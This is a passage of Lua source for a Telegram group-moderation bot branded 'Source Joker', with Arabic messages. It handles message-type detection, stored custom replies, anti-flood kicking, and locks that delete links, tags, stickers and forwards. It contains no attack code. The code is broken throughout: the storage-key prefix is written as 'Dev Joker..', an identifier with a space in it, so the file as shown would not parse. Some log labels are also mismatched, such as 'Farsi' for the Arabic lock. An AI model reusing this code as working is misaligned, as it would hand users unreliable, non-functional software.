DevAbs:incr(Dev Joker.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageSticker" then
DevAbs:incr(Dev Joker.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
--     Source Joker     --
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
--     Source Joker     --
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Added ]")
msg_type = 'MSG:NewUserAdd'
end
--     Source Joker     --
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
--     Source Joker     --
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
--     Source Joker     --
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
--     Source Joker     --
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
--     Source Joker     --
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
--     Source Joker     --
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
--     Source Joker     --
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
--     Source Joker     --
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
--     Source Joker     --
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
msg_type = 'MSG:JoinByLink'
end
--     Source Joker     --
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end
---
end
--     Source Joker     --
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
--     Source Joker     --
text = msg.content_.text_ 
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local content_text = DevAbs:get(Dev Joker..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'save_repgp' then 
if text == 'الغاء' then
local delrep_owner = DevAbs:get(Dev Joker..'delrep_owner'..msg.chat_id_..'')
DevAbs:srem(Dev Joker..'rep_owner'..msg.chat_id_..'',delrep_owner)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
DevAbs:del(Dev Joker..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_)
DevAbs:del(Dev Joker..'delrep_owner'..msg.chat_id_..'')
return false
end
DevAbs:del(Dev Joker..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
local content_text = DevAbs:get(Dev Joker..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then DevAbs:set(Dev Joker..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevAbs:set(Dev Joker..'file_repgp'..content_text..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevAbs:set(Dev Joker..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevAbs:set(Dev Joker..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevAbs:set(Dev Joker..'audio_repgp'..content_text..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAbs:set(Dev Joker..'photo_repgp'..content_text..''..msg.chat_id_..'', photo_in_group) 
end
if msg.content_.animation_ then DevAbs:set(Dev Joker..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevAbs:set(Dev Joker..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
DevAbs:del(Dev Joker..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(Dev Joker..'delrep_owner'..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not DevAbs:get(Dev Joker..'lock_reeeep'..msg.chat_id_) then 
if DevAbs:get(Dev Joker..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Dev Joker..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevAbs:get(Dev Joker..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Dev Joker..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevAbs:get(Dev Joker..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Dev Joker..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevAbs:get(Dev Joker..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Dev Joker..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevAbs:get(Dev Joker..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Dev Joker..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevAbs:get(Dev Joker..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Dev Joker..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevAbs:get(Dev Joker..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Dev Joker..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
end
if DevAbs:get(Dev Joker..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then
function ABS_PROX(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local edit_msg = DevAbs:get(Dev Joker..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAbs:get(Dev Joker..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs + Dev_Abss or 'لا يوجد'))
local Text = Text:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
Dev_Abs(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
end
getUser(msg.sender_user_id_, ABS_PROX)
end
end
--     Source Joker     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local content_text = DevAbs:get(Dev Joker.."add:repallt"..msg.sender_user_id_)
if content_text == 'save_rep' then
if text == 'الغاء' then
local delrep_sudo = DevAbs:get(Dev Joker..'delrep_sudo')
DevAbs:del(Dev Joker.."rep_sudo",delrep_sudo)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
DevAbs:del(Dev Joker.."addreply2:"..msg.sender_user_id_)
DevAbs:del(Dev Joker.."add:repallt"..msg.sender_user_id_)
DevAbs:del(Dev Joker.."delrep_sudo")
return false
end
DevAbs:del(Dev Joker.."add:repallt"..msg.sender_user_id_)
local content_text = DevAbs:get(Dev Joker.."addreply2:"..msg.sender_user_id_)
if msg.content_.video_ then
DevAbs:set(Dev Joker.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevAbs:set(Dev Joker.."file_repall"..content_text, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevAbs:set(Dev Joker.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevAbs:set(Dev Joker.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevAbs:set(Dev Joker.."audio_repall"..content_text, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAbs:set(Dev Joker.."photo_repall"..content_text, photo_in_all_groups)
end
if msg.content_.animation_ then
DevAbs:set(Dev Joker.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevAbs:set(Dev Joker.."text_repall"..content_text, msg.content_.text_)
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
DevAbs:del(Dev Joker.."addreply2:"..msg.sender_user_id_)
DevAbs:del(Dev Joker..'delrep_sudo')
return false end end
if msg.content_.text_ and not DevAbs:get(Dev Joker..'lock_reeeep'..msg.chat_id_) then
if DevAbs:get(Dev Joker.."video_repall"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Dev Joker.."video_repall"..msg.content_.text_))
end
if DevAbs:get(Dev Joker.."file_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Dev Joker.."file_repall"..msg.content_.text_))
end
if DevAbs:get(Dev Joker.."voice_repall"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Dev Joker.."voice_repall"..msg.content_.text_))
end
if DevAbs:get(Dev Joker.."audio_repall"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Dev Joker.."audio_repall"..msg.content_.text_))
end
if DevAbs:get(Dev Joker.."photo_repall"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Dev Joker.."photo_repall"..msg.content_.text_))
end
if  DevAbs:get(Dev Joker.."gif_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(Dev Joker.."gif_repall"..msg.content_.text_))
end
if DevAbs:get(Dev Joker.."stecker_repall"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(Dev Joker.."stecker_repall"..msg.content_.text_))
end
if DevAbs:get(Dev Joker.."text_repall"..msg.content_.text_) then
function ABS_PROX(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local edit_msg = DevAbs:get(Dev Joker..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAbs:get(Dev Joker.."text_repall"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs + Dev_Abss or 'لا يوجد'))
local Text = Text:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
Dev_Abs(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
end
getUser(msg.sender_user_id_, ABS_PROX)
end
end 
-- end functions Dev Joker --
--      Anti FLood       -- 
--      Flood Max        --
local flmax = 'flood:max:'..msg.chat_id_
if not DevAbs:get(Dev Joker..flmax) then
floodMax = 5
else
floodMax = tonumber(DevAbs:get(Dev Joker..flmax))
end
--     Source Joker     --
--          Msg           --
local pm = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not DevAbs:get(Dev Joker..pm) then
msgs = 0
else
msgs = tonumber(DevAbs:get(Dev Joker..pm))
end
--     Source Joker     --
--    Flood Check Time    --
local TIME_CHECK = 2
--     Source Joker     --
--      Flood Check       --
if msgs > (floodMax - 1) then
if DevAbs:get(Dev Joker..'floodstatus'..msg.chat_id_) == 'Kicked' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
Text = '⌁︙العضو ↫ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..') \n⌁︙قام بالتكرار المحدد تم طرده '
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
elseif DevAbs:get(Dev Joker..'floodstatus'..msg.chat_id_) == 'DelMsg' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
else
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
end
end
--     Source Joker     --
--      Process mod       --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local fname = dp.first_name_ or ""
local lname = dp.last_name_ or ""
local name = fname .. " " .. lname
local username = dp.username_
if username then
DevAbs:set(Dev Joker..'user:Name'..msg.sender_user_id_,"@"..username)
else
DevAbs:set(Dev Joker..'user:Name'..msg.sender_user_id_,name)
end;end,nil)   
--     Source Joker     --
----- START MSG CHECKS -----
if is_Ban(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
return
end
if is_Muted(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
if is_BanAll(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(chat,msgs)
return
end
if is_MuteAll(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
DevAbs:incr(Dev Joker..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(Dev Joker..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
if msg.content_.ID == "MessagePinMessage" then
if DevAbs:get(Dev Joker..'pinnedmsg'..msg.chat_id_) and DevAbs:get(Dev Joker..'bot:pin:mute'..msg.chat_id_) then
unpinmsg(msg.chat_id_)
local pin_id = DevAbs:get(Dev Joker..'pinnedmsg'..msg.chat_id_)
pinmsg(msg.chat_id_,pin_id,0)
end
end
if DevAbs:get(Dev Joker..'bot:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevAbs:del(Dev Joker..'bot:viewget'..msg.sender_user_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عدد مشاهدات المنشور هو ↫ ('..msg.views_..') \n ', 1, 'md')
DevAbs:del(Dev Joker..'bot:viewget'..msg.sender_user_id_)
end
end
--     Source Joker     --
--         Photo          --
if msg_type == 'MSG:Photo' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Photo]")
end
end
end
if DevAbs:get(Dev Joker..'bot:photo:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Photo]")
end
end
if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Photo]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Photo]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Photo]")
end
end
end
end
--     Source Joker     --
--        Markdown        --
elseif msg_type == 'MSG:MarkDown' then
if DevAbs:get(Dev Joker..'markdown:lock'..msg.chat_id_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
--     Source Joker     --
--        Document        --
elseif msg_type == 'MSG:Document' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Document]")
end
end
end
if DevAbs:get(Dev Joker..'bot:document:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Document]")
end
end
if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Document]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Document]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Dev Joker..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Document]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Dev Joker..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Document]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Dev Joker..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Document]")
end
end
end
end
--     Source Joker     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
if DevAbs:get(Dev Joker..'bot:inline:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Inline]")
end
end
--     Source Joker     --
--        Sticker         --
elseif msg_type == 'MSG:Sticker' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
if DevAbs:get(Dev Joker..'bot:sticker:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Sticker]")
end
end
elseif msg_type == 'MSG:JoinByLink' then
if DevAbs:get(Dev Joker..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_ 
delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
if DevAbs:get(Dev Joker..'welcome:'..msg.chat_id_) then
text = DevAbs:get(Dev Joker..'welcome:'..msg.chat_id_)
else
text = '• نورت حبي \n• [firstname lastname] \n• [@username]'
end
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
local text = text:gsub('username',(result.username_ or 'BLACK_TEAM_4'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if DevAbs:get(Dev Joker.."bot:welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source Joker     --
--      New User Add      --
elseif msg_type == 'MSG:NewUserAdd' then
if DevAbs:get(Dev Joker..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
if not is_admin(msg.content_.members_[0].id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'bot:bots:gkgk'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
end
end
if is_Ban(msg.content_.members_[0].id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
if DevAbs:get(Dev Joker.."bot:welcome"..msg.chat_id_) then
if DevAbs:get(Dev Joker..'welcome:'..msg.chat_id_) then
text = DevAbs:get(Dev Joker..'welcome:'..msg.chat_id_)
else
text = '• نورت حبي \n• [firstname lastname] \n• [@username]'
end
local text = text:gsub('firstname',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('lastname',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('username',(msg.content_.members_[0].username_ or 'BLACK_TEAM_4'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source Joker     --
--        Contact         --
elseif msg_type == 'MSG:Contact' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Contact]")
end
end
end
if DevAbs:get(Dev Joker..'bot:contact:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Contact]")
end
end
--     Source Joker     --
--         Audio          --
elseif msg_type == 'MSG:Audio' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(Dev Joker..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(Dev Joker..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Audio]")
end
end
end
if DevAbs:get(Dev Joker..'bot:music:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(Dev Joker..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Audio]")
end
end
if DevAbs:get(Dev Joker..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Audio]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Dev Joker..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Audio]")
end
end
